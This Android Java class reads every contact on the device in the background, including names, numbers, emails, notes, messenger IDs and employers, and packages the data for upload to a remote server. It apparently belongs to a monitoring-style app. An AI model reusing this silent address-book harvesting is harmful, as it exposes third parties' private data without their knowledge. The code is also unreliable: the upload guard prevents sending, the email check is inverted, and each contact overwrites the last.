package com.inet.android.contacts;

import java.util.ArrayList;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;

import com.inet.android.request.DataRequest;
import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.Logging;

public class GetContacts extends AsyncTask<Context, Void, Void> {
	Context mContext;
	private int type = 6;

	ArrayList<String> email = null;
	ArrayList<String> emailType = null;
	ArrayList<CharSequence> CustomemailType = null;
	private JSONObject jsonInfo;
	private JSONObject jsonPhoneType;
	private JSONObject jsonName;
	private JSONObject jsonEmailId;
	private JSONObject jsonEmailCount;
	private JSONObject jsonNote;
	private JSONObject jsonImId;
	private JSONObject jsonImCount;
	private JSONObject jsonOrganization;
	private JSONObject jsonObject;
	private JSONArray data = new JSONArray();
	private JSONObject jsonAllContact;
	private String LOG_TAG = "GetContacts";
	private String sendJSONStr;

	public void readContacts() throws JSONException {
		data = new JSONArray();
		jsonAllContact = new JSONObject();
		jsonObject = new JSONObject();

		ContentResolver cr = mContext.getContentResolver();
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, null);

		if (cur.getCount() > 0) {
			while (cur.moveToNext()) {

				jsonInfo = new JSONObject();
				jsonName = new JSONObject();
				jsonPhoneType = new JSONObject();
				jsonEmailId = new JSONObject();
				jsonEmailCount = new JSONObject();
				jsonNote = new JSONObject();
				jsonImId = new JSONObject();
				jsonImCount = new JSONObject();
				jsonOrganization = new JSONObject();
				
				email = new ArrayList<String>();
				emailType = new ArrayList<String>();

				CustomemailType = new ArrayList<CharSequence>();
				String id = cur.getString(cur
						.getColumnIndex(ContactsContract.Contacts._ID));
				String name = cur
						.getString(cur
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

				if (Integer
						.parseInt(cur.getString(cur
								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
					// Log.d("GetContacts", "name : " + name + ", ID : " + id);
					jsonName.put("name", name);
					// ----------------------------------------------------------------------------------------------------------------------------------
					// get the phone number
					Cursor pCur = cr.query(
							ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Phone.CONTACT_ID
									+ " = ?", new String[] { id }, null);
					while (pCur.moveToNext()) {
						String mPhone = pCur
								.getString(pCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
						String phoneType = getTipe(pCur
								.getInt(pCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
						jsonPhoneType.put(mPhone, phoneType);
					}

					pCur.close();
					// ------------------------------------------------------------------------------------------
					// get email and type
					// -----------------------------------------------------------------------------------------------------------------------------------------
					Cursor emailCur = cr.query(
							ContactsContract.CommonDataKinds.Email.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Email.CONTACT_ID
									+ " = ?", new String[] { id }, null);
					while (emailCur.moveToNext()) {
						// This would allow you get several email addresses
						// if the email addresses were stored in an array

						String sEmail = emailCur
								.getString(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
						int type = emailCur
								.getInt(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
						String customLabel = emailCur
								.getString(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
						CharSequence cCustomemailType = ContactsContract.CommonDataKinds.Email
								.getTypeLabel(mContext.getResources(), type,
										customLabel);
						if (sEmail != null)
							jsonEmailCount.put(sEmail, cCustomemailType);
					}
					jsonEmailId.put("email", jsonEmailCount);
					emailCur.close();
					// --------------------------------------------------------------------------------------------------------------------------------------------------

					// Get note.......
					String noteWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] noteWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE };

					Cursor noteCur = cr.query(
							ContactsContract.Data.CONTENT_URI, null, noteWhere,
							noteWhereParams, null);
					if (noteCur.moveToFirst()) {
						String note = noteCur
								.getString(noteCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
						if (note != null)
							jsonNote.put("note", note);
					}
					noteCur.close();

					// ----------------------------------------------------------------------------------------------------------------------------------------------------
					// Get Instant Messenger.........
					String imWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] imWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
					Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
							null, imWhere, imWhereParams, null);
					if (imCur.moveToFirst()) {
						String imName = imCur
								.getString(imCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
						String imType;
						imType = getTipeIm(imCur
								.getInt(imCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE)));
						jsonImCount.put(imType, imName);
						// Log.d("ContactInstance", imName + imType);
					}
					jsonImId.put("im", jsonImCount);
					imCur.close();
					// ----------------------------------------------------------------------------------------------------------------------------------------------------

					// Get Organizations.........

					String orgWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] orgWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
					Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
							null, orgWhere, orgWhereParams, null);
					if (orgCur.moveToFirst()) {
						String orgName = orgCur
								.getString(orgCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
						String title = orgCur
								.getString(orgCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));

						if (orgName != null || title != null)
							jsonOrganization.put("org", orgName + " " + title);
					}
					orgCur.close();

				}
//				JSONObject object = new JSONObject();

				if (!jsonName.isNull("name"))
					jsonInfo.put("name", jsonName);
				jsonInfo.put("number", jsonPhoneType);
				if (!jsonInfo.isNull("email"))
					jsonInfo.put("email", jsonEmailId);
				jsonInfo.put("note", jsonNote);
				jsonInfo.put("im", jsonImId);
				jsonInfo.put("org", jsonOrganization);
				jsonObject.put("info", jsonInfo);
				Logging.doLog(LOG_TAG, jsonPhoneType.toString(),
						jsonPhoneType.toString());
			}
			cur.close();
			if (sendJSONStr != null) {
//				Logging.doLog(LOG_TAG, sendJSONStr,
//						sendJSONStr);
				sendJSONStr = jsonObject.toString();
				
				OnDemandRequest dr = new OnDemandRequest(mContext, type);
				dr.sendRequest(sendJSONStr);
				
			}
		}
		
	}


	private String getTipe(int phonetype) {
		String sType = "";
		int phoneType = phonetype;
		switch (phoneType) {
		case 1:
			sType = "Home";
			break;
		case 2:
			sType = "Mobile";
			break;
		case 3:
			sType = "Work";
			break;
		case 4:
			sType = "Home Fax";
			break;
		case 5:
			sType = "Work Fax";
			break;
		case 6:
			sType = "Main";
			break;
		case 7:
			sType = "Other";
			break;
		case 8:
			sType = "Custom";
			break;
		case 9:
			sType = "Pager";
			break;
		}
		return sType;
	}

	private String getTipeIm(int imType) {
		int immType = imType;
		String stringType;
		switch (immType) {
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_AIM:
			stringType = "AIM";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_GOOGLE_TALK:
			stringType = "Google Talk";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_ICQ:
			stringType = "ICQ";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_JABBER:
			stringType = "Jabber";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_MSN:
			stringType = "MSN";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_NETMEETING:
			stringType = "NetMeeting";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_QQ:
			stringType = "QQ";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_SKYPE:
			stringType = "Skype";
			break;
		case ContactsContract.CommonDataKinds.Im.PROTOCOL_YAHOO:
			stringType = "Yahoo";
			break;
		default:
			stringType = "custom";
			break;
		}
		return stringType;

	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Auto-generated method stub
		this.mContext = params[0];
		Logging.doLog(LOG_TAG, "doIn");
		try {
			readContacts();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
